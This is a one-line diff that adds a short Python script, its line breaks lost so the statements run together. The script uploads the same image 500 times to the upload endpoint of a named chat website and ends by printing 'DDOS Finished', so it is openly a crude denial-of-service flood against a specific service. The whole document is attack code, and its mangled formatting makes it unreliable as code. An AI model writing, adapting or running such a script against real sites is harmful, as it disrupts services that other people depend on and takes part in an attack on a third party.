@@ -1,0 +1,1 @@
+import requestsdomain = 'https://chatiraq5.chat'path = '/pic?secid=u&fn=png'file = 'eliot2.png'url = domain + pathfor i in range(500):  files = {'photo': open(file, 'rb')}  res = requests.post(url, files=files)  print("Image", i+1, "Sent")print("DDOS Finished")
